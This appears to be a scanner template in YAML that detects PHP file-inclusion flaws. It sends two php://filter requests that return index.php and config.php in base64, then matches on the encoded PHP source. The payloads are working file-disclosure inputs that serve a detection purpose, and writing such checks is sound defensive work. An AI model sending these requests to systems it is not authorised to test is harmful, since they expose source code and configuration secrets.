name: PHP Stream Wrapper Abuse Detection
description: Probes for PHP stream wrapper abuse (php://, data://, expect://) through file inclusion parameters. PHP wrappers can be used to execute arbitrary code, read source files with base64 encoding, or access remote resources.
severity: critical
tags:
  - php
cwe: CWE-98

requests:
  - method: GET
    path: /?page=php://filter/convert.base64-encode/resource=index.php
  - method: GET
    path: /?file=php://filter/read=convert.base64-encode/resource=config.php

matchers:
  - regex: "[A-Za-z0-9+/]{40,}={0,2}"
  - body_contains: "PD9waHA"
  - status_code: 200
